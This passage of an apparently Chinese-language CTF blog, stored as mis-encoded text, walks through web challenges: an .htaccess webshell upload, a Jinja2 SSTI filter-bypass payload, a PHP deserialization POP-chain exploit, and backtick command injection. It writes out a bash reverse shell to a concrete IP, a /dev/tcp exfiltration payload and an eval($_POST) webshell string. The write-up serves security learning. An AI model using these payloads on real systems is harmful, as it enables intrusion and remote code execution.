src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825205743738-733807108.png\" width=500>\n\nä¸Šä¼ æˆåŠŸï¼æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•æŠŠè¿™ä¸ªä¸Šä¼ çš„`.png`æ–‡ä»¶è§£æä¸º`.php`æ–‡ä»¶ã€‚\n\näº†è§£åˆ°`.htaccessæ–‡ä»¶(æˆ–è€…\"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶\"ï¼‰`\n> htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚\n\nå…¶ä¸­`AddtypeæŒ‡ä»¤`å¯ä»¥å°†ç»™å®šçš„æ–‡ä»¶æ‹“å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹ï¼š\n\n```\nAddType media-type extension [extension] ...\n \nç¤ºä¾‹ï¼š\nAddType application/x-httpd-php .gif\n \nå°†ä»¥ gif ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æ\n\nAddType application/x-httpd-php png  jpg gif\nå°†ä»¥ä¸Šçš„å¤šä¸ªåç¼€éƒ½å½“ä½œphpè§£æã€‚\n```\n\nå¹¶ä¸”ï¼Œé€šè¿‡ `php_value` æ¥è®¾ç½® `auto_prepend_file` æˆ–è€… `auto_append_file` é…ç½®é€‰é¡¹**åŒ…å«**ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼ŒåŒæ—¶åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•é‡Œ**éœ€è¦æœ‰å¯è§£æçš„phpæ–‡ä»¶æ¥è§¦å‘**ã€‚\n\nç»“åˆä»¥ä¸Šä¸¤ä¸ªæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª`.htaccess`æ–‡ä»¶ï¼š\n\n```\nAddtype application/x-httpd-php .jpg\n#å°†ä»¥ jpg ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æ\n\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=webshell.jpg\"\n#é…åˆphpä¼ªåè®®+åŒ…å«â€œå‡½æ•°â€å®ç°æ–‡ä»¶æ‰§è¡Œ \n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825220347514-316795705.png\" width=500>\n\nä¿®æ”¹è¯·æ±‚åŒ…ä¸Šä¼ æˆåŠŸã€‚\n\næŒ‰ç…§è·¯å¾„æ‰“å¼€webshell.jpg->å½“ä½œphpè§£æ->è§¦å‘`php_value auto_append_file`æŒ‡ä»¤->æ‰§è¡Œæºç \n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221309028-1614586059.png\" width=500>\n\nè¿æ¥èšå‰‘ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°Flag.\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221608176-1984943651.png\" width=500>\n\n[æŸ¥é˜…èµ„æ–™ï¼š[.htaccessçš„åˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§](https://blog.csdn.net/snowlyzz/article/details/126267637)]\n\n***\n\n# EasySSTI\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825222602197-1595222581.png\" width=500>\n\nä¸Šæ¥å°±è®©æˆ‘ä»¬ç™»å½•ï¼ˆæˆªè¿™å¼ å›¾å®Œå…¨å› ä¸ºbackgroundå¥½çœ‹å“ˆå“ˆå“ˆâ¤ï¼‰\n\næ ¹æ®é¢˜ç›®åç§°æç¤ºï¼Œè¿™é¢˜è€ƒå¯Ÿæˆ‘ä»¬SSTIã€‚è¡¥ä¹ äº†ä¸€äº›SSTIçš„çŸ¥è¯†åã€[æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰](https://www.cnblogs.com/ialoe/p/ssti.html)ã€‘ï¼Œå…ˆç”¨bpæŠ“åŒ…ï¼Œæ‰¾æ³¨å…¥ç‚¹ï¼š\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916012811391-903505005.png\" width=200>\nå‘ç°åœ¨`username`å¤„æœ‰jinja2æ¨¡æ¿å¼•æ“çš„SSTIæ¼æ´ã€‚\näºæ˜¯ç”¨`''.__class__`ç­‰è¿›è¡Œç®€å•æµ‹è¯•ï¼Œå‘ç°`_`ï¼Œ`'`ï¼Œ`\"`ï¼Œ` `ï¼Œ`[`éƒ½è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯ç”¨`{{().request.args.class}}&class=__class__`å°è¯•ç»•è¿‡ï¼Œç»“æœ`request`ä¹Ÿè¢«è¿‡æ»¤ã€‚ï¼ˆäº‹å®ä¸Š`globals`ï¼Œ`getitem`ï¼Œ`os`ï¼Œ`read`ï¼Œ`popen`ï¼Œ`pop`ä¹Ÿéƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘è¿˜æ²¡æœ‰æµ‹å‡ºæ¥ï¼‰\nä»å…¶ä»–å¸ˆå‚…é‚£é‡Œpiaoåˆ°å°å§¿åŠ¿ï¼š`{{config}}å¯ä»¥ç”¨æ¥æŸ¥çœ‹é…ç½®ä¿¡æ¯ï¼Œé€šè¿‡è¿™ä¸ªæˆ–è®¸èƒ½å¤Ÿæ„é€ å‡ºæˆ‘è¦çš„payload`\n\n```\n&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;\n```\n\næ‰¾åˆ°`\\`ï¼Œå¯ä»¥åˆ©ç”¨`config|string|list`è·å–ä»¥æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹æ ¹ç›®å½•......\næ¥ç»­ç¿»æŸ¥èµ„æ–™äº†è§£åˆ°ï¼š\n\n```\n1. pythonä¸‹çš„æ•°æ®æ‹¼æ¥\njoin æ–¹æ³• æ‹¼æ¥å­—å…¸ï¼Œä¸»è¦ç”¨äºç´¢å¼•ä¸Šçš„åˆå¹¶:é»˜è®¤æŒ‰ç´¢å¼•åˆå¹¶ï¼Œå¯ä»¥åˆå¹¶ç›¸åŒæˆ–ç›¸ä¼¼çš„ç´¢å¼•ï¼Œä¸ç®¡ä»–ä»¬æœ‰æ²¡æœ‰é‡å åˆ—\n\n2. {{()|select|string|list}}  or  {{lipsum|select|string|list}}     \nè·å–å­—ç¬¦åˆ—è¡¨  \n\n3. {{lipsum.__globals__['os'].popen('ls').read()}}\nå‘½ä»¤æ‰§è¡Œ\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916033307544-1063948328.png\" width=500>\n\nç”±æ­¤å¯ä»¥ç”¨è¯¸å¦‚ä»¥ä¸‹çš„æ–¹å¼æ„é€ æˆ‘ä»¬éœ€è¦çš„è¢«â€œè¿‡æ»¤â€çš„å…³é”®å­—ï¼š\n\n```\n#æ„é€ po=\"pop\"     #åˆ©ç”¨dict()|joinæ‹¼æ¥å¾—åˆ°\n{% set po=dict(po=a,p=a)|join%}\n \n#æ„é€ a=(()|select|string|list).pop(24),è¿™é‡Œaå³ä¸‹åˆ’çº¿_\n{% set a=(()|select|string|list)|attr(po)(24)%}\n \n#æ„é€ ini=\"__init__\"\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n \n#æ„é€ glo=\"__globals__\"\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n \n#æ„é€ geti=\"__getitem__\"\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n \n#æ„é€ built=\"__builtins__\"\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n \n#æ„é€ sub=\"__subclasses__\"\n{% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%}\n\n#æ„é€ chr()å‡½æ•°è°ƒç”¨\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n\n#æ„é€ file='/flag'\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n```\n\n\nå›åˆ°è¿™ä¸€é¢˜ï¼Œå› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ç”¨`%0a`æ¢è¡Œç¬¦ç»•è¿‡ã€‚å‘½ä»¤æ‰§è¡Œpayloadæ„é€ è¿‡ç¨‹ï¼š\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}                        #pop\n{%set%0aa=(()|select|string|list)|attr(po)(24)%}          #_\n{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}  #globals\n{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%} #getitem\n{%set%0ape=dict(po=aaa,pen=aaa)|join()%}                  #popen\n{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}               #read\ndict(o=a,s=a)|join()                #è·å– os\n(config|string|list)|attr(po)(279)  #è·å–  /\n\n\n{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n<==>\n{{lipsum.__globals__['os'].popen('ls').read()}}\n```\n\næˆåŠŸæ„é€ payloadï¼š\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916165007009-950366739.png\">\n\nä¿®æ”¹payloadï¼Œå°†`ls`æ”¹ä¸º`ls /`ï¼Œä¸Šè¿°dictæ‹¼æ¥åŠæ³•ä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘æ“ä½œæœ‰é—®é¢˜ï¼‰ï¼Œç›´æ¥`()|select|string|list`ä¸€ä¸ªä¸ªè·å–ï¼š\n\n```\n((()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(18),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279))|join()\n```\n\nå‘ç°flagåæŒ‰ç…§ä¸Šè¿°åŠæ³•å°†å‘½ä»¤ä¿®æ”¹ä¸º`cat /flag`ï¼š\n\n```\n((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join()\n```\n\næˆåŠŸè·å–FLAGï¼Œæœ€åç»™å‡ºæœ€ç»ˆå®Œæ•´çš„Payloadï¼š\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()}}\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› web","url":"/2022/12/06/2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›-web/","content":"\n# ezpop\nç»™å‡ºäº†æºç ï¼š\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\nif (isset($_POST['cmd'])) {\n    unserialize($_POST['cmd']);\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\n\næ˜¾ç„¶ï¼Œè¿™æ˜¯è¦æˆ‘ä»¬æ‰¾åˆ°ä¸€æ¡POPé“¾ã€‚\næˆ‘ä»¬ä»ç›®çš„å‡ºå‘ï¼Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„å‡½æ•°`eval()`â€”â€”å¯ä»¥å°†å­—ç¬¦ä¸²æŒ‰ç…§phpä»£ç æ¥è®¡ç®—ã€‚å¦‚æœä¼ å…¥`system()`å‡½æ•°è°ƒç”¨å¤–éƒ¨å‘½ä»¤å®ç°rceï¼Œå°±æœ‰å¯èƒ½æ‰¾åˆ°flagã€‚\nå¯ä»¥æ˜ç¡®ç”¨`mix::get_flag()`å‡½æ•°è§¦å‘`eval()`ï¼Œé‚£ä¹ˆï¼Œå¦‚ä½•è§¦å‘`mix::get_flag()`ï¼š\n1ã€é€šè¿‡`mix::runï¼ˆï¼‰`è§¦å‘ï¼Œä½†è¿™æ ·ä¼šé™åˆ¶$m1ä¸º\"get_flag\"ï¼Œä»è€Œæ— æ³•åˆ©ç”¨`eval()`æ‰§è¡Œå‘½ä»¤ï¼Œè¡Œä¸é€šï¼›\n2ã€é€šè¿‡`fin::__call($a, $b)`è§¦å‘ï¼Œå°†mixä¼ å…¥finçš„`$f1`å³å¯ï¼Œå¯è¡Œã€‚\næ¥ä¸‹æ¥ï¼Œå¦‚ä½•è§¦å‘`fin::__call($a, $b)`æˆäº†é—®é¢˜ï¼Œç›®å‰å°±åªå½¢æˆäº†è¿™æ ·çš„é“¾å­\n`fin::__call() --> mix::get_flag()`\nå€’æ¨å›°éš¾ï¼Œæˆ‘ä»¬å°±æ‰¾å…¥å£æ­£æ¨ã€‚è¿™é‡Œæ³¨æ„åˆ°è¿™æ ·å‡ ä¸ªé­”æœ¯æ–¹æ³•\n\n```\n__destruct()  //å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\n__toString()  //å½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘\n__invoke()    //å½“å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n__call()      //å½“å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n```\n\nè€Œ`fin::_destruct()`æ°å¥½å¯ä»¥ç”¨æ¥è§¦å‘`what::_toString()`ï¼Œä»è€Œå¯ä»¥è§¦å‘`run()`ï¼Œç»§è€Œå†è§¦å‘ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœè§¦å‘`_invoke()`ï¼Œç”±äº`world()`ä¸å¯è®¿é—®ï¼Œå°±å¯ä»¥ç”¨ä¹‹è§¦å‘`_call()`ï¼Œä»è€Œå½¢æˆå®Œæ•´çš„POPé“¾ï¼š\n\n```fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()```\n\nï¼ˆè¿™é‡Œç”¨çš„`fin::run()`ï¼Œå¦ä¸€ä¸ªä¼¼ä¹ä¹Ÿå¯ä»¥ï¼‰ã€‚\n\nå¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š`eval()`ç”¨'#'è¿›è¡Œäº†è¿‡æ»¤ï¼Œå› æ­¤è¿˜éœ€è¦ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥é€‰ç”¨`?>`é—­åˆï¼Œä¹Ÿå¯ä»¥é€‰ç”¨`\\n`æ¢è¡Œç¬¦ï¼\næ„é€ expå¦‚ä¸‹ï¼š\n\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\n//fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()\n\n$a=new fin();//ä¸ºäº†è°ƒç”¨__destruct()æ–¹æ³•\n$b=new fin();\n//$b=new mix;\n$c=new fin();\n$d=new crow();\n$e=new what();\n$f=new mix();\n\n$a->f1=$e;//ä¸ºäº†è°ƒç”¨__toString()æ–¹æ³•\n$e->a=$b;//ä¸ºäº†å»è°ƒç”¨runæ–¹æ³•\n$b->f1=$d;//ä¸ºäº†å»è°ƒç”¨__invoke()æ–¹æ³•\n$d->v1=$c;//ä¸ºäº†å»è°ƒç”¨__call()æ–¹æ³•\n$c->f1=$f;//ä¸ºäº†å»è°ƒç”¨get_flag()æ–¹æ³• \n$f->m1=\"\\nsystem('ls /');\" ;//ç”¨ \\n ç»•è¿‡æ³¨é‡Šç¬¦\n\necho urlencode(serialize($a));\n?>\n```\nå¾—åˆ°`O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A16%3A%22%0Asystem%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`\n\næœ€åç”¨bpä¼ å‚å³å¯ï¼ˆè¿™é‡Œç”¨`ls /`å‘½ä»¤æŸ¥æ ¹ç›®å½•è¾ƒéº»çƒ¦ï¼Œäºæ˜¯ç”¨`ls`æŸ¥å½“å‰ç›®å½•ï¼Œä¹Ÿä¸å¾ˆå¥½æ‰¾ï¼Œæœ€åé€‰æ‹©ç”¨`cat *`æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ï¼Œç»“æœå¦‚ä¸‹å›¾ï¼‰\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220822003739417-1945498056.png\" width=500>\næˆåŠŸæ‰¾åˆ°flagï¼\n\n***\nè¯¥é¢˜åœ¨æ„é€ popé“¾ä¸Šæ€è·¯ä¸ç®—æ··ä¹±ï¼ˆå¯èƒ½è·Ÿæˆ‘å·çœ‹äº†ä¸€çœ¼wpæœ‰å…³ï¼‰ï¼Œä½†æ˜¯åœ¨ä¼ å‚ä¸Šé‡åˆ°äº†å¾ˆå¤§çš„é—®é¢˜ï¼Œä¸€æ–¹é¢HackBarï¼ˆä¼°è®¡æ˜¯HBè‡ªèº«é—®é¢˜ï¼‰æ€»æ˜¯å¤±è´¥æäººå¿ƒæ€ï¼Œå¦ä¸€æ–¹é¢ç”¨burp suiteå‘é€POSTè¯·æ±‚çš„æ–¹æ³•æ²¡æœ‰æŒæ¡ï¼Œå³æœ‰ä¸‰ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼š\n1ã€GETä¿®æ”¹ä¸ºPOSTæ–¹æ³•\n2ã€åŠ ä¸Šåª’ä½“ç±»å‹ä¿¡æ¯ï¼šContent-Type: application/x-www-form-urlencoded\n3ã€æœ«å°¾æ·»åŠ éœ€ä¸Šä¼ è¯­å¥ï¼šcmd=xxxx\n***\n\nå¦å¤–æœ‰å¸ˆå‚…åœ¨æ„é€ expæ—¶ä¼ å…¥`\"?><? @eval(\\$_POST[b]);\"`ï¼Œç»§è€Œåˆ©ç”¨èšå‰‘è¿æ¥æ‰¾flagï¼Œä½†æ˜¯åšä¸»å°šæœªå¼„æ¸…èšå‰‘ğŸ—¡çš„è¿™ä¸€åŠŸèƒ½ï¼Œå¾…ç ”ç©¶åæ›´æ–°ã€‚\nè¯¦æƒ…è¯·è®¿é—®è¿™ä½å¸ˆå‚…çš„Blog[ã€2022DASCTF X SUã€‘ ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› webå¤ç°](https://blog.csdn.net/qq_51295677/article/details/124283836?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&utm_relevant_index=2)\n\n# calc\né¢˜ç›®ä¸Šæ¥å°±ç»™ä¸ªè®¡ç®—å™¨ï¼Œæ‰“å¼€æºç ï¼Œå‘ç°æ˜¯ç”¨pythonå†™çš„è®¡ç®—å™¨ã€‚æºç æ”¾åœ¨ä¸‹é¢ï¼š\n```\n#coding=utf-8\nfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\nimport random\nfrom urllib import parse\nimport os\nfrom werkzeug.utils import secure_filename\nimport time\n\n\napp=Flask(__name__)\n\ndef waf(s):\n    blacklist = ['import','(',')',' ','_','|',';','\"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\n    flag = True\n    for no in blacklist:\n        if no.lower() in s.lower():\n            flag= False\n            print(no)\n            break\n    return flag\n    \n\n@app.route(\"/\")\ndef index():\n    \"æ¬¢è¿æ¥åˆ°SUctf2022\"\n    return render_template(\"index.html\")\n\n@app.route(\"/calc\",methods=['GET'])\ndef calc():\n    ip = request.remote_addr\n    num = request.values.get(\"num\")\n    log = \"echo {0} {1} {2}> ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num)\n    \n    if waf(num):\n        try:\n            data = eval(num)\n            os.system(log)\n        except:\n            pass\n        return str(data)\n    else:\n        return \"waf!!\"\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=5000) \n```\n \nå®¡æŸ¥ä»£ç å‘ç°æœ‰`GET`ä¼ å‚ï¼Œæ‰¾åˆ°äº†å£å­ã€‚åˆ†æå¯çŸ¥æ˜¯ç”¨`GET`ä¼ å‚æ§åˆ¶`num`å˜é‡ï¼Œä½œä¸º`log = \"echo {0} {1} {2}> ./tmp/log.txt\"`ä¸­çš„`{2}`ã€‚å†çœ‹ä¸‹å»å°±èƒ½å‘ç°ä¸¤ä¸ªå¾ˆæ•æ„Ÿçš„å‡½æ•°ï¼š\n\n```\n  data = eval(num) //\n  os.system(log) //å°†å­—ç¬¦ä¸²è½¬åŒ–æˆå‘½ä»¤åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œ\n```\n\n[os.system()](https://blog.csdn.net/W1995S/article/details/114759238)\nç”±äº`num`è¢«`waf()`è¿‡æ»¤å¾—å¤ªå¤šï¼Œæˆ‘ä»¬åªèƒ½æŠŠç›®æ ‡æ”¾åœ¨`os.system(log)`ä¸Šï¼Œæƒ³åŠæ³•å¯¹`log`ä¸‹æ‰‹ï¼ŒæŸ¥æ‰¾bash shellä¸­å¯ä»¥åšå‘½ä»¤æ›¿æ¢çš„å‡½æ•°ï¼š`$()ã€eval()ä¸``åå¼•å·`ï¼Œç”±äº`$å’Œeval`è¢«è¿‡æ»¤ï¼Œè¿™é‡Œåªèƒ½é€‰ç”¨åå¼•å·ï¼ˆä¼˜å…ˆæ‰§è¡Œ\\`ä»£ç \\`ï¼‰ã€‚[èµ„æ–™æŸ¥é˜…ï¼š[åå¼•å·ä¸$()çš„åŒºåˆ«ä»¥åŠevalçš„ä½œç”¨](https://blog.csdn.net/hj605635529/article/details/73556855)]\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºä¼šå°†numæ’å…¥åˆ°logå­—ç¬¦ä¸²çš„æœ€åç„¶åå…ˆåæ‰§è¡Œ evalï¼ˆnumï¼‰å’Œos.systemï¼ˆlogï¼‰ï¼Œå› æ­¤ä¸èƒ½è®©eval(num)æŠ¥é”™è€Œæ— æ³•è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œè€ƒè™‘pythonçš„ç‰¹æ€§ï¼Œæƒ³åˆ°å¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦`#`æ³¨é‡Šã€‚\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¸Œæœ›å»ºç«‹åå¼¹shellï¼Œå°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æˆ‘ä»¬çš„æ”»å‡»ç«¯\n\n```\nbash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\nbash -i >& /dev/tcp/101.43.119.212/12306 0>&1\n```\n\n[èµ„æ–™æŸ¥é˜…ï¼š[Linuxä¸‹åå¼¹shellçš„åŸç†](https://blog.csdn.net/m0_57497184/article/details/123404378)]\nä½†æ˜¯`&`ä¹Ÿè¢«banäº†ï¼Œæ²¡æ³•ç›´æ¥ç”¨ï¼Œä½†æ˜¯ä¹Ÿèƒ½å¾—å‡ºä¸€ä¸ªæ€è·¯ï¼š**è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»æœº**ã€‚\n\n```payloadï¼š/calc?num=1%23`ls%09>/dev/tcp/IP/2333` ```\n\nè¿™é‡Œç”±äºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œ`ls >`å†™æˆ`ls%09>`ï¼Œç„¶ååœ¨æ”»å‡»ç«¯ç›‘å¬2333ç«¯å£`nc -lvp 2333`\nç„¶åä¿®æ”¹`ls`å‘½ä»¤å³å¯ï¼Œè¿™é‡Œåšä¸»æœåŠ¡å™¨ç›‘å¬ä¸åˆ°ï¼Œä»ç„¶åœ¨æ‰¾é—®é¢˜ã€‚\n\n***\n\n# upgdstore\næ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œéšä¾¿ä¸Šä¼ 